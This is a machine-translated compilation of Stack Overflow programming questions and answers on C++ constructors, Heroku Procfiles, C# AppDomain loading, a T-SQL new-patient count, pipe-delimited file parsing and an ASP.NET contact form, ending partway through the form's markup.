i) 应使用成员-对象初始化程序来初始化在基类中声明的数据成员，例如 var1。

ii) i) 在基类构造函数中完成。它说，这只能通过派生类构造函数调用。

iii) 基类是一个抽象类，它的对象不能被创建。但是，我有第三节课，在其中，我使用：

```
baseClass *baseObjects[5]; 
```

编译器不报告错误。

**我**不明白 i) 和 ii) 的真正含义。用简单的话来解释就好了。此外，欢迎对 iii) 提供任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:22:26.273

问题 1：阅读构造函数：[http ://www.cprogramming.com/tutorial/constructor_destructor_ordering.html](http://www.cprogramming.com/tutorial/constructor_destructor_ordering.html)

问题2：阅读初始化列表：
[http ://www.cprogramming.com/tutorial/initialization-lists-c++.html](http://www.cprogramming.com/tutorial/initialization-lists-c++.html)

问题 3：阅读指向派生类的指针：http:
[//www.learncpp.com/cpp-tutorial/121-pointers-and-references-to-the-base-class-of-derived-objects/](http://www.learncpp.com/cpp-tutorial/121-pointers-and-references-to-the-base-class-of-derived-objects/)

我认为这种方式不仅仅是回答你的问题，你可以理解发生了什么，

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:15:20.417

我认为最好有插图。

一世）

```
class A
{
  int i;
 public:
  A(int ii) : i(ii) {}
} 
```

该部分`i(ii)`是成员 - 对象初始化程序的示例。由于 C++ 保证在输入构造函数主体之前调用成员的所有构造函数，因此这是指定为每个成员调用哪个构造函数的唯一方法。

ii) 在 C++ 中没有`super`关键字。您必须这样指定基类：

```
 class B : public A
 {
 public:
   B(int i) : A(i) {}
 } 
```

这部分是因为 C++ 允许多重继承。

iii) 请注意，您没有创建任何对象，只创建了指向对象的指针。正是通过这种方法，通过继承实现的多态性在 C++ 中得以实现。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T18:18:32.923

```
#include <iostream>

class Base
{
public:
    Base(int i)
    {}

    virtual ~Base() = 0
    {}

protected:
    int i_;
};

class Derived: public Base
{
public:
    Derived(int i, int j) : Base(i), j_(j)
    {}

private:
    int j_;
};

int main(int argc, char* argv[])
{
    //Base b(1); object of abstract class is not allowed
    Derived d(1, 2); // this is fine
} 
```

如您所见， i_ 正在由 Derived 类通过调用 Base 类构造函数来初始化。析构函数上的 = 0 确保 Base 类是纯虚拟的，因此我们无法实例化它（参见 main 中的注释）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-14T18:22:01.143

i) 以下是所谓的初始化列表，您可以使用初始化列表来确保数据成员在进入构造函数之前具有值。所以在下面的例子中，`a`在你进入构造函数之前有值 10。

```
Class baseClass
{
    int a;
public:
    baseClass(int x):a(x)
    {
    }
} 
```

ii) 这就是您从派生类构造函数显式调用基类构造函数的方式。

```
Class derivedClass : public baseClass
{
    int a;
public:
    derivedClass(int x):baseClass(x)
    {
    }
} 
```

iii) 您不能直接创建抽象类的实例。但是，您可以创建指向抽象基类的指针，并让这些指针指向它的任何具体实现。因此，如果您有一个抽象基类`Bird`和具体实现`Parrot`，`Sparrow`然后`Bird* bird`可以指向 a`Parrot`或`Sparrow`实例，因为它们都是鸟。

# ruby-on-rails - 具有多个面向 Web 进程的 Heroku Cedar 应用程序

> ID：12429687
> 
> 赞同：1
> 
> 时间：2012-09-14T18:01:29.180
> 
> 标签：ruby-on-rails, heroku

是否可以配置 a`Procfile`以支持多个 Web 端点（通过端口或子域）？就像是：

```
web: bundle exec unicorn -p $PORT -c ./config/unicorn.rb
admin: bundle exec unicorn -p $ALT_PORT -c ./config/admin/unicorn.rb 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T21:08:38.217

只有`web`将绑定到一个端口，如果您需要多个 Web 端点，您可以配置多个 dns 条目以指向同一个应用程序，或者您可以部署多个单独的 heroku 应用程序。您希望通过使用相同的应用程序代码和我们访问的两种不同的流程类型来实现什么？

## 更新

关于仅为 Web 进程设置端口的问题，我可能错了。

你可以运行`$ heroku run bash`然后`$ echo $PORT`它看起来像一个设置。但是，我不知道请求是如何路由到这些进程而不是 Web 进程的。

# c# - 无法通过 AppDomain 加载文件或程序集

> ID：12429689
> 
> 赞同：1
> 
> 时间：2012-09-14T18:01:39.043
> 
> 标签：c#, .net

我有以下代码将 DLL 加载到新的`AppDomain`，我面临错误：

> 无法加载文件或程序集

请，任何线索我错过了什么？

```
const string pluginFolder = "Plugins";
var   _domainSetup = new AppDomainSetup
   {
        ShadowCopyFiles = "true",
        ShadowCopyDirectories = null,
        CachePath = Path.Combine(Environment.CurrentDirectory, pluginFolder),
        ApplicationBase = Environment.CurrentDirectory,
        PrivateBinPath = Path.Combine(Environment.CurrentDirectory, pluginFolder)
    };

var adi = new AppDomainInitializer(AppDomainInit);
_domainSetup.AppDomainInitializer = adi;

var PersonalDomain = 
    AppDomain.CreateDomain("SomeAppDomainName", null, _domainSetup);

var assemblyName = AssemblyName.GetAssemblyName(@"C:\myFile.dll");

var LoadedAssembly = PersonalDomain.Load(assemblyName); 
```

# sql - 根据上次与医生就诊的日期对患者记录进行分组和计数

> ID：12429693
> 
> 赞同：-2
> 
> 时间：2012-09-14T18:01:43.940
> 
> 标签：sql, sql-server, sql-server-2008, tsql

这是我的数据：

```
+----------+---------------+------------+---------------------+
|  doctor  | received_date | patient_id | accession_daily_key |
+----------+---------------+------------+---------------------+
|  A       |  1/1/2011     |  ABC123    |                   1 |
|  A       |  1/20/2011    |  AAA123    |                   2 |
|  A       |  1/21/2011    |  AAA123    |                   3 |
|          |               |            |                   4 |
|  A       |  2/1/2011     |  ABC123    |                   5 |
|  A       |  2/9/2011     |  BBBYYY    |                   6 |
|          |               |            |                   7 |
|  B       |  1/2/2011     |  ABC123    |                   8 |
|  B       |  1/20/2011    |  AXA435    |                   9 |
|  B       |  1/19/2011    |  AAA123    |                  10 |
|          |               |            |                  11 |
|  B       |  2/1/2011     |  ABC123    |                  12 |
|  B       |  2/10/2011    |  BBBYYY    |                  13 |
+----------+---------------+------------+---------------------+ 
```

这是我想要的结果：

```
+--------+-------+--------------------+
| doctor | month | count new patients |
+--------+-------+--------------------+
| A      |     1 |                  1 |
| A      |     2 |                  1 |
| B      |     1 |                  2 |
| B      |     2 |                  0 |
+--------+-------+--------------------+ 
```

我想为每个月的医生统计新病人。

我得到的业务规则是：

> 1.  一名患者只能与一名医生相关联
> 2.  与患者相关联的医生是最后一位看过他的医生

这是我到目前为止所拥有的：

```
select patient_id,max(month(RECEIVED_DATE)) AS Mnth, max(year(RECEIVED_DATE)) AS Yr, ACCESSION_DAILY_KEY
    FROM [F_ACCESSION_DAILY] 
    where RECEIVED_MLIS_INFORMATION=1
    GROUP BY patient_id,ACCESSION_DAILY_KEY 
```

此查询将为我提供包含与患者相关联的医生的行的`primary key` **accession_daily_key 。**

您能否指导我如何获得每个月每个医生在该特定月份的新患者数量？

* * *

由 jcolebrand 编辑：

```
CREATE TABLE F_ACCESSION_DAILY (
    doctor VARCHAR(10) NOT NULL
  , received_date DATETIME NOT NULL
  , patient_id VARCHAR(10) NOT NULL
  , accession_daily_key INT NOT NULL
)

INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('A','1/1/2011','ABC123','1')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('A','1/20/2011','AAA123','2')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('A','1/21/2011','AAA123','3')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('A','2/1/2011','ABC123','5')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('A','2/9/2011','BBBYYY','6')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('B','1/2/2011','ABC123','8')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('B','1/20/2011','AXA435','9')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('B','1/19/2011','AAA123','10')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('B','2/1/2011','ABC123','12')
INSERT INTO F_ACCESSION_DAILY (doctor,received_date,patient_id,accession_daily_key) VALUES ('B','2/10/2011','BBBYYY','13') 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:10:41.500

~~您可能必须使用子查询分两步执行此操作：~~

 ~~1.  获取所有新患者就诊的列表：

    选择医生，分钟（日期）作为首次就诊，患者从就诊中按患者分组；

2.  按月分组汇总

    SELECT医生，COUNT（*），MONTH（firstvisit）作为月份，YEAR（firstvisit）作为年份（...）按医生分组，MONTH（firstvisit），YEAR（firstvisit）;~~ 

综上所述，以下应该可以工作：

```
SELECT doctor, COUNT(*) newPatients, MONTH(firstvisit) AS month, YEAR(firstvisit) AS year FROM 
        (SELECT doctor, MIN(date) AS firstvisit ,patient FROM visits GROUP BY patient)
    GROUP BY doctor, MONTH(firstvisit), YEAR(firstvisit); 
```

~~没有子查询也可以做到这一点，但我不确定它是否能正常工作。~~

好的，编辑更新：

您现在需要四个（？）步骤：

1.  确定每位患者的最后一次就诊

    SELECT 患者，MAX(date) lastvisit FROM 就诊 GROUP BY 患者；

2.  确定每个专利的相关医生，作为最后一次访问的医生：

    从就诊中选择医生、患者 v LEFT JOIN (...) lv ON v.patient=lv.patient WHERE v.date=lv.lastvisit;

3.  确定与最新医生的首次就诊

    选择医生，患者，MIN（日期）firstvisit FROM访问v LEFT JOIN（...）dp ON v.doctor = dp.doctor WHERE v.patient = dp.patient GROUP BY患者；

4.  像以前一样总结每个医生每月的第一次访问：

    SELECT医生，COUNT（*），MONTH（firstvisit）作为月份，YEAR（firstvisit）作为年份（...）按医生分组，MONTH（firstvisit），YEAR（firstvisit）;

给出一个有点可怕且效率可疑的总数：

 ~~~~```
SELECT doctor, COUNT(*), MONTH(firstvisit) AS month, YEAR(firstvisit) AS year 
    FROM (
    SELECT doctor, patient, MIN(date) firstvisit
        FROM visits v 
        LEFT JOIN (
            SELECT doctor, patient FROM visits v 
                LEFT JOIN (
                    SELECT patient, date lastvisit 
                        FROM visits GROUP BY patient) lv 
                ON v.patient=lv.patient 
                WHERE v.date=lv.lastvisit) dp 
        ON v.doctor=dp.doctor
        WHERE v.patient=dp.patient
        GROUP BY patient) 
    GROUP BY doctor, MONTH(firstvisit), YEAR(firstvisit); 
```~~ 

~~我再次认为这可能至少可以压缩一点。~~

 ~~EDIT2：感谢 jcolebrand，工作 SQL：[http ://sqlfiddle.com/#!3/41beb/25](http://sqlfiddle.com/#!3/41beb/25)

```
SELECT
       t.doctor
     , COUNT(t.doctor)
     , MONTH(t.firstvisit) AS MONTH
     , YEAR(t.firstvisit) AS YEAR
  FROM (
    SELECT
           v.doctor
         , v.patient_id
         , MIN(received_date) firstvisit
      FROM F_ACCESSION_DAILY v
 LEFT JOIN (
            SELECT
                   v.doctor
                 , v.patient_id
              FROM F_ACCESSION_DAILY v
         LEFT JOIN (
                    SELECT patient_id
                         , received_date lastvisit
                      FROM F_ACCESSION_DAILY
                  GROUP BY patient_id
                         , received_date
                  ) lv ON v.patient_id=lv.patient_id
             WHERE v.received_date=lv.lastvisit
          ) dp ON v.doctor = dp.doctor
    WHERE v.patient_id=dp.patient_id
    GROUP BY v.patient_id
           , v.doctor
  ) t
 GROUP BY
       t.doctor
     , MONTH(t.firstvisit)
     , YEAR(t.firstvisit); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-14T18:13:10.653

> 请注意，这是在他的第一次信息迭代中，并且由于 Zeb 已经在进一步的答案方面做得很好，因此出于历史追溯的原因，我将离开此。随意忽略这个有利于他的答案，但对于迭代过程，这是一个很好的学习示例。

我认为这似乎应该满足您的需求

```
SELECT
       MIN(received_date) AS FirstVisit
     , patient_id         AS PatientID
INTO #LookupTable
FROM F_ACCESSION_DAILY

SELECT 
       f.doctor           AS Doctor
     , COUNT(f.*)         AS CountNewPatients
     , MONTH(firstvisit)  AS Month
     , YEAR(firstvisit)   AS Year
FROM F_ACCESSION_DAILY f 
INNER JOIN #LookupTable l ON f.received_date = l.FirstVisit 
                         AND f.patient_id = l.PatientID
GROUP BY f.doctor
       , MONTH(firstvisit)
       , YEAR(firstvisit)

DROP TABLE #LookupTable 
```~~~~

# .net - 如何处理 500,000 条记录的管道分隔文件？

> ID：12429694
> 
> 赞同：1
> 
> 时间：2012-09-14T18:01:59.007
> 
> 标签：.net, windows

我们在管道分隔的文本文件中接收文件，并正在寻找一种有效的方法来解析文件以查找一致性错误。有一个模板指定规则，即字段的长度，字段的数据类型，是否强制。因此，我将根据该模板（当前只是一个 word 文档）检查管道分隔文件。

1.  如何在 PC 不冻结的情况下解析文件？（分块阅读。Streamreader？）
2.  重要的是，您建议我将“规则模板”存储在哪里？在 XML 文件中还是在具有其他应用程序设置的 sqlite 数据库中？

关于如何最好地做到这一点的任何建议？

该工具必须在 Windows 环境中（VB.Net）

样本数据：

```
Company A|Company A ltd|3453457675|C565474567||UK|C3423454534|b3345|A|003||D3KCI3KF||0|001||+44-22523280||P.O.BOX 42027|P.O.BOX 42027|LIVERPOOL|UK|00100|L.R. NO. 209/5827, BY PASS ROAD|OFF BY PASS ROAD||UK|UK|PEOPLE SOFT|PEOPLE SOFT|PEOPLESOFT|2345435|S||B|34344444|45556666|Z|0|BP|0|3445345|0|2343545654|0|0|D|23434534534||0||453564645||1232434523|0|324345230000101|0|S 
```

谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-01-13T11:06:44.063

SED - 是一个很棒的工具 - 它有 Windows 端口。相当类似于 PERL 的选项，但是非常快速和强大，我必须处理大量的交换日志，而 SED 能够在几秒钟内处理。

# c# - ASP.NET ADO.NET 联系表

> ID：12429700
> 
> 赞同：-1
> 
> 时间：2012-09-14T18:02:26.903
> 
> 标签：c#, asp.net, ado.net

首先让我说我是 ASP 的新手，并且在过去的几周里已经尽我所能来学习脚本。我在设置 aspx.cs 页面以获取要在服务器上发布的信息时遇到问题。任何帮助将非常感激。

Web 表单是一个页面，需要收集文本字段、RadioButton、下拉列表和复选框列表。对于复选框列表，如果选中则收集 1，如果未选中则收集 0。

它需要能够使用 asp.net 2.0、IIS 6、C#、SQL Server 2008 R2。

```
public partial class _Default : System.Web.UI.Page
{
    public string GetConnectionString()
    {
        //sets the connection string from your web config file "ConnString" is the name of your Connection String
        return ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
    }

private void ExecuteInsert(string 1, string 2, string 3, string 4, string 5, string 6, string 7, string 8, string 9, string 10, string 11, string 12, string 13, string 14, string 15, string 16, string 17, string 18, string 19, string 20, string 21, string 22, string 23, string 24, string 25, string 26, string 27, string 28, string 29, string 30, string 31, string 32, string 33, string 34, string 35, string 36, string 37, string 38, string 39, string 40, string 41, string 42, string 43, string 44, string 45, string 46, string 47, string 48, string 49, string 50, string 51, string 52, string 53, string 54, string 55, string 56, string 57, string 58, string 59, string 60, string 61, string 62, string 63, string 64, string 65, string 66)
{
    SqlConnection conn = new SqlConnection(GetConnectionString());
    string sql = "INSERT INTO webContactForm (1,  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66) VALUES (@1,  @2,  @3,  @4,  @5,  @6,  @7,  @8,  @9,  @10, @11, @12, @13, @14, @15, @16, @17, @18, @19, @20, @21, @22, @23, @24, @25, @26, @27, @28, @29, @30, @31, @32, @33, @34, @35, @36, @37, @38, @39, @40, @41, @42, @43, @44, @45, @46, @47, @48, @49, @50, @51, @52, @53, @54, @55, @56, @57, @58, @59, @60, @61, @62, @63, @64, @65, @66)";

    try
    {
        conn.Open();
        SqlCommand cmd = new SqlCommand(sql, conn);
        SqlParameter[] param = new SqlParameter[66];
        //param[0] = new SqlParameter("@Contact_id", SqlDbType.Int, 20);
        param[0] = new SqlParameter("@1", SqlDbType.VarChar, 200);
        param[1] = new SqlParameter("@2", SqlDbType.VarChar, 200);
        param[2] = new SqlParameter("@3", SqlDbType.VarChar, 200);
        param[3] = new SqlParameter("@4", SqlDbType.VarChar, 200);
        param[4] = new SqlParameter("@5", SqlDbType.VarChar, 200);
        param[5] = new SqlParameter("@6", SqlDbType.VarChar, 200);
        param[6] = new SqlParameter("@7", SqlDbType.VarChar, 200);
        param[7] = new SqlParameter("@8", SqlDbType.VarChar, 200);
        param[8] = new SqlParameter("@9", SqlDbType.VarChar, 200);
        param[9] = new SqlParameter("@10", SqlDbType.VarChar, 200);
        param[10] = new SqlParameter("@11", SqlDbType.VarChar, 200);
        param[11] = new SqlParameter("@12", SqlDbType.VarChar, 200);
        param[12] = new SqlParameter("@13", SqlDbType.VarChar, 200);
        param[13] = new SqlParameter("@14", SqlDbType.VarChar, 200);
        param[14] = new SqlParameter("@15", SqlDbType.VarChar, 200);
        param[15] = new SqlParameter("@16", SqlDbType.VarChar, 200);
        param[16] = new SqlParameter("@17", SqlDbType.VarChar, 200);
        param[17] = new SqlParameter("@18", SqlDbType.VarChar, 200);
        param[18] = new SqlParameter("@19", SqlDbType.VarChar, 200);
        param[19] = new SqlParameter("@20", SqlDbType.VarChar, 200);
        param[20] = new SqlParameter("@21", SqlDbType.VarChar, 200);
        param[21] = new SqlParameter("@22", SqlDbType.VarChar, 200);
        param[22] = new SqlParameter("@23", SqlDbType.VarChar, 200);
        param[23] = new SqlParameter("@24", SqlDbType.VarChar, 200);
        param[24] = new SqlParameter("@25", SqlDbType.VarChar, 200);
        param[25] = new SqlParameter("@26", SqlDbType.VarChar, 200);
        param[26] = new SqlParameter("@27", SqlDbType.VarChar, 200);
        param[27] = new SqlParameter("@28", SqlDbType.VarChar, 200);
        param[28] = new SqlParameter("@29", SqlDbType.VarChar, 200);
        param[29] = new SqlParameter("@30", SqlDbType.VarChar, 200);
        param[30] = new SqlParameter("@31", SqlDbType.VarChar, 200);
        param[31] = new SqlParameter("@32", SqlDbType.VarChar, 200);
        param[32] = new SqlParameter("@33", SqlDbType.VarChar, 200);
        param[33] = new SqlParameter("@34", SqlDbType.VarChar, 200);
        param[34] = new SqlParameter("@35", SqlDbType.VarChar, 200);
        param[35] = new SqlParameter("@36", SqlDbType.VarChar, 200);
        param[36] = new SqlParameter("@37", SqlDbType.VarChar, 200);
        param[37] = new SqlParameter("@38", SqlDbType.VarChar, 200);
        param[38] = new SqlParameter("@39", SqlDbType.VarChar, 200);
        param[39] = new SqlParameter("@40", SqlDbType.VarChar, 200);
        param[40] = new SqlParameter("@41", SqlDbType.VarChar, 200);
        param[41] = new SqlParameter("@42", SqlDbType.VarChar, 200);
        param[42] = new SqlParameter("@43", SqlDbType.VarChar, 200);
        param[43] = new SqlParameter("@44", SqlDbType.VarChar, 200);
        param[44] = new SqlParameter("@45", SqlDbType.VarChar, 200);
        param[45] = new SqlParameter("@46", SqlDbType.VarChar, 200);
        param[46] = new SqlParameter("@47", SqlDbType.VarChar, 200);
        param[47] = new SqlParameter("@48", SqlDbType.VarChar, 200);
        param[48] = new SqlParameter("@49", SqlDbType.VarChar, 200);
        param[49] = new SqlParameter("@50", SqlDbType.VarChar, 200);
        param[50] = new SqlParameter("@51", SqlDbType.VarChar, 200);
        param[51] = new SqlParameter("@52", SqlDbType.VarChar, 200);
        param[52] = new SqlParameter("@53", SqlDbType.VarChar, 200);
        param[53] = new SqlParameter("@54", SqlDbType.VarChar, 200);
        param[54] = new SqlParameter("@55", SqlDbType.VarChar, 200);
        param[55] = new SqlParameter("@56", SqlDbType.VarChar, 200);
        param[56] = new SqlParameter("@57", SqlDbType.VarChar, 200);
        param[57] = new SqlParameter("@58", SqlDbType.VarChar, 200);
        param[58] = new SqlParameter("@59", SqlDbType.VarChar, 200);
        param[59] = new SqlParameter("@60", SqlDbType.VarChar, 200);
        param[60] = new SqlParameter("@61", SqlDbType.VarChar, 200);
        param[61] = new SqlParameter("@62", SqlDbType.VarChar, 200);
        param[62] = new SqlParameter("@63", SqlDbType.VarChar, 200);
        param[63] = new SqlParameter("@64", SqlDbType.VarChar, 200);
        param[64] = new SqlParameter("@65", SqlDbType.VarChar, 200);
        param[65] = new SqlParameter("@66", SqlDbType.VarChar, 200);
    param[66] = new SqlParameter("@67", SqlDbType.VarChar, 200);

        param[0].Value = 1;
        param[1].Value = 2;
        param[2].Value = 3;
        param[3].Value = 4;
        param[4].Value = 5;
        param[5].Value = 6;
        param[6].Value = 7;
        param[7].Value = 8;
        param[8].Value = 9;
        param[9].Value = 10;
        param[10].Value = 11;
        param[11].Value = 12;
        param[12].Value = 13;
        param[13].Value = 14;
        param[14].Value = 15;
        param[15].Value = 16;
        param[16].Value = 17;
        param[17].Value = 18;
        param[18].Value = 19;
        param[19].Value = 20;
        param[20].Value = 21;
        param[21].Value = 22;
        param[22].Value = 23;
        param[23].Value = 24;
        param[24].Value = 25;
        param[25].Value = 26;
        param[26].Value = 27;
        param[27].Value = 28;
        param[28].Value = 29;
        param[29].Value = 30;
        param[30].Value = 31;
        param[31].Value = 32;
        param[32].Value = 33;
        param[33].Value = 34;
        param[34].Value = 35;
        param[35].Value = 36;
        param[36].Value = 37;
        param[37].Value = 38;
        param[38].Value = 39;
        param[39].Value = 40;
        param[40].Value = 41;
        param[41].Value = 42;
        param[42].Value = 43;
        param[43].Value = 44;
        param[44].Value = 45;
        param[45].Value = 46;
        param[46].Value = 47;
        param[47].Value = 48;
        param[48].Value = 49;
        param[49].Value = 50;
        param[50].Value = 51;
        param[51].Value = 52;
        param[52].Value = 53;
        param[53].Value = 54;
        param[54].Value = 55;
        param[55].Value = 56;
        param[56].Value = 57;
        param[57].Value = 58;
        param[58].Value = 59;
        param[59].Value = 60;
        param[60].Value = 61;
        param[61].Value = 62;
        param[62].Value = 63;
        param[63].Value = 64;
        param[64].Value = 65;
        param[65].Value = 66;
        param[66].Value = 67;

        //create loop to insert
        for (int i = 0; i < param.Length; i++)
        {
            cmd.Parameters.Add(param[i]);
        }

        cmd.CommandType = CommandType.Text;
        cmd.ExecuteNonQuery();
    }
    catch (System.Data.SqlClient.SqlException ex)
    {
        string msg = "Error occured while inserting:";
        msg += ex.Message;
        throw new Exception(msg);
    }
    finally
    {
        conn.Close();
    }
    }
    private object GetConnectionString(string p)
    {
throw new NotImplementedException();
    }
    protected void Button1_Click(object sender, EventArgs e){
        //call the method to execute insert to the database
        cmd.Parameters.Add(new SqlParameter("@MyParamter", "my value"));

        ClearControls(Page);
}
} 
```

# 网络表格代码：

```
 <%@ Page Language="C#"  AutoEventWireup="true" CodeFile="Default.aspx.cs"" Inherits="Default2" %>

 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

 <html xmlns="http://www.w3.org/1999/xhtml">

 <head id="Head1" runat="server">
<title>Contact Us</title>

  </head>
   <body>
    <form id="form1" runat="server">
     <div>
      <table class="style1">
        <tr>
            <td class="style4">TextBox column 1:</td>
            <td class="style2">
                <asp:TextBox ID="1" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 2:</td>
            <td class="style2">
                <asp:TextBox ID="LName" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">3 TextBox column 3,4,5:</td>
            <td class="style2">
                <asp:TextBox ID="3" runat="server" Width="60px"></asp:TextBox>-
                <asp:TextBox ID="4" runat="server" Width="59px"></asp:TextBox>-
                <asp:TextBox ID="5" runat="server" Width="62px"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 6:</td>
            <td class="style2">
                <asp:TextBox ID="6" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">ListItem column 7:</td>
            <td class="style2">
            <asp:DropDownList ID="7" runat="server"
                              AppendDataBoundItems="true">
            <asp:ListItem Value="-1">Select</asp:ListItem>
            <asp:ListItem>A</asp:ListItem>
            <asp:ListItem>B</asp:ListItem>
            <asp:ListItem>C</asp:ListItem>
            <asp:ListItem>D</asp:ListItem>
            <asp:ListItem>E</asp:ListItem>
            <asp:ListItem>F</asp:ListItem>
            <asp:ListItem>G</asp:ListItem>
            </asp:DropDownList>
            </td>
        </tr>
        <tr>
            <td class="style4">RadioButton column 8</td>
            <td class="style2">
                <asp:RadioButton ID="Yes" runat="server" Checked="True" />
                <asp:RadioButton ID="No" runat="server" />
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 9:</td>
            <td class="style2">
                <asp:TextBox ID="9" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 10:</td>
            <td class="style2">
                <asp:TextBox ID="ClientLName" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">RadioButton Column 11:</td>
            <td class="style2">
                <asp:RadioButton ID="Female" runat="server" />
                <asp:RadioButton ID="Male" runat="server" />
            </td>
        </tr>
        <tr>
            <td class="">3 TextBox column 12,13,14:</td>
            <td class="">
                <asp:TextBox ID="12" runat="server" Width="50px"></asp:TextBox>(mm)/<asp:TextBox ID="13" runat="server" Width="50px"></asp:TextBox>(dd)/<asp:TextBox ID="14" runat="server" Width="85px"></asp:TextBox>(yyyy)
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 15:</td>
            <td class="style2">
                <asp:TextBox ID="15" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 16:</td>
            <td class="style2">
                <asp:TextBox ID="16" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 17:</td>
            <td class="style2">
                <asp:TextBox ID="17" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="style4">Dropdownlist column 18:</td>
            <td class="style2">
            <asp:DropDownList ID="18" runat="server"
                              AppendDataBoundItems="true">
         <asp:ListItem value="-1">Select State</asp:ListItem>
         <asp:ListItem value="AL">Alabama</asp:ListItem>
         <asp:ListItem value="AR">Arkansas</asp:ListItem>
         <asp:ListItem value="AZ">Arizona</asp:ListItem>
         <asp:ListItem value="CA">California</asp:ListItem>
         <asp:ListItem value="CO">Colorado</asp:ListItem>
         <asp:ListItem value="CT">Connecticut</asp:ListItem>
         <asp:ListItem value="DC">District of Columbia</asp:ListItem>
         <asp:ListItem value="DE">Delaware</asp:ListItem>
         <asp:ListItem value="FL">Florida</asp:ListItem>
         <asp:ListItem value="GA">Georgia</asp:ListItem>
         <asp:ListItem value="IA">Iowa</asp:ListItem>
         <asp:ListItem value="ID">Idaho</asp:ListItem>
         <asp:ListItem value="IL">Illinois</asp:ListItem>
         <asp:ListItem value="IN">Indiana</asp:ListItem>
         <asp:ListItem value="KS">Kansas</asp:ListItem>
         <asp:ListItem value="KY">Kentucky</asp:ListItem>
         <asp:ListItem value="LA">Louisiana</asp:ListItem>
         <asp:ListItem value="MA">Massachusetts</asp:ListItem>
         <asp:ListItem value="MD">Maryland</asp:ListItem>
         <asp:ListItem value="ME">Maine</asp:ListItem>
         <asp:ListItem value="MI">Michigan</asp:ListItem>
         <asp:ListItem value="MN">Minnesota</asp:ListItem>
         <asp:ListItem value="MO">Missouri</asp:ListItem>
         <asp:ListItem value="MS">Mississippi</asp:ListItem>
         <asp:ListItem value="MT">Montana</asp:ListItem>
         <asp:ListItem value="NC">North Carolina</asp:ListItem>
         <asp:ListItem value="ND">North Dakota</asp:ListItem>
         <asp:ListItem value="NE">Nebraska</asp:ListItem>
         <asp:ListItem value="NH">New Hampshire</asp:ListItem>
         <asp:ListItem value="NJ">New Jersey</asp:ListItem>
         <asp:ListItem value="NM">New Mexico</asp:ListItem>
         <asp:ListItem value="NV">Nevada</asp:ListItem>
         <asp:ListItem value="NY">New York</asp:ListItem>
         <asp:ListItem value="OH">Ohio</asp:ListItem>
         <asp:ListItem value="OK">Oklahoma</asp:ListItem>
         <asp:ListItem value="OR">Oregon</asp:ListItem>
         <asp:ListItem value="PA">Pennsylvania</asp:ListItem>
         <asp:ListItem value="RI">Rhode Island</asp:ListItem>
         <asp:ListItem value="SC">South Carolina</asp:ListItem>
         <asp:ListItem value="SD">South Dakota</asp:ListItem>
         <asp:ListItem value="TN">Tennessee</asp:ListItem>
         <asp:ListItem value="TX">Texas</asp:ListItem>
         <asp:ListItem value="UT">Utah</asp:ListItem>
         <asp:ListItem value="VA">Virginia</asp:ListItem>
         <asp:ListItem value="VT">Vermont</asp:ListItem>
         <asp:ListItem value="WA">Washington</asp:ListItem>
         <asp:ListItem value="WI">Wisconsin</asp:ListItem>
         <asp:ListItem value="WV">West Virginia</asp:ListItem>
         <asp:ListItem value="WY">Wyoming</asp:ListItem>
            </asp:DropDownList>
            </td>
        </tr>
        <tr>
            <td class="style4">TextBox column 19:</td>
            <td class="style2">
                <asp:TextBox ID="19" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
        <td>
        <h1>
        Providing:
       </h1>
        </td>
        <td>

        </td>
        </tr>
        <tr>
        <td>
            <asp:CheckBoxList ID="CheckBoxList1" runat="server">
                <asp:ListItem Value="20">Want 1</asp:ListItem>
                <asp:ListItem Value="21">Want 2</asp:ListItem>
                <asp:ListItem Value="22">Want 3</asp:ListItem>
                <asp:ListItem Value="23">Want 4</asp:ListItem>
                <asp:ListItem Value="24">Want 5</asp:ListItem>
                <asp:ListItem Value="25">Want 6</asp:ListItem>
